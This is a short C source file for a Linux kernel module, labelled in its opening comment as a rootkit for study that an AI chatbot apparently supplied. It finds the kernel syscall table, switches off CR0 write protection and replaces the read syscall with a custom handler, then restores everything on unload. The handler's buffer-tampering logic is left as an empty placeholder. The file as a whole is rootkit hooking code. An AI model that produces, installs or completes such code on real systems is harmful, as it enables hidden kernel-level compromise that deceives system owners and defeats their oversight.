// another rootkit given by chaptgpt to study and look at


#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>

// Pointer to the original read syscall
asmlinkage long (*original_read)(unsigned int, char __user *, size_t);

// Custom handler for read syscall
asmlinkage long custom_read(unsigned int fd, char __user *buf, size_t count) {
    printk(KERN_INFO "Custom read handler called\n");
    // Call the original SYS_read handler (optional)
    long result = original_read(fd, buf, count);

    // Modify the buffer contents (example: replace filenames)
    if (result > 0) {
        // Custom logic to manipulate `buf`
    }

    return result;  // Return modified or original result
}

static int __init hook_sys_read_init(void) {
    // Locate sys_call_table
    unsigned long *sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    if (!sys_call_table) {
        printk(KERN_ERR "Could not locate sys_call_table\n");
        return -1;
    }

    // Save the original SYS_read pointer
    original_read = (void *)sys_call_table[__NR_read];

    // Modify the sys_call_table entry for SYS_read
    write_cr0(read_cr0() & (~0x10000)); // Disable write-protection
    sys_call_table[__NR_read] = (unsigned long)custom_read;
    write_cr0(read_cr0() | 0x10000);  // Re-enable write-protection

    printk(KERN_INFO "Custom read handler installed\n");
    return 0;
}

static void __exit hook_sys_read_exit(void) {
    // Restore the original SYS_read pointer
    unsigned long *sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    write_cr0(read_cr0() & (~0x10000));
    sys_call_table[__NR_read] = (unsigned long)original_read;
    write_cr0(read_cr0() | 0x10000);

    printk(KERN_INFO "Custom read handler removed\n");
}

module_init(hook_sys_read_init);
module_exit(hook_sys_read_exit);
MODULE_LICENSE("GPL");
